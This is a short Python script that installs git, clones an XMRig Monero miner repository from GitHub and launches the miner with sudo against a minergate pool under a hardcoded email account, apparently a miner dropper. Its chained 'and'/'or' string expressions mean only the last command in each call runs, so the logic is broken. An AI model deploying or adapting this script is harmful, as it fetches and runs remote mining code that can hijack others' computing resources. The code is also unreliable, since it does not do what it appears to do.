
from os import system 
try:
    print(system('sudo apt update -y' and 'sudo apt upgrade -y'))
    print(system('sudo apt install git -y' or 'sudo apt install git'))
    print(system('git clone https://github.com/quincyhays/bmxmrig.git' and 'cd bmxmrig' and 'chmod u+x xmrig' and 'sudo ./xmrig -o xmr.pool.minergate.com:45700 -u abolfazl1383abedy1383@gmail.com -p x'))
except:
    print(system('apt update -y' and 'apt upgrade -y'))
    print(system('apt install git -y' or 'apt install git'))
    print(system('git clone https://github.com/quincyhays/bmxmrig.git' and 'cd bmxmrig' and 'chmod u+x xmrig' and './xmrig-notls -o xmr.pool.minergate.com:45700 -u abolfazl1383abedy1383@gmail.com -p x'))
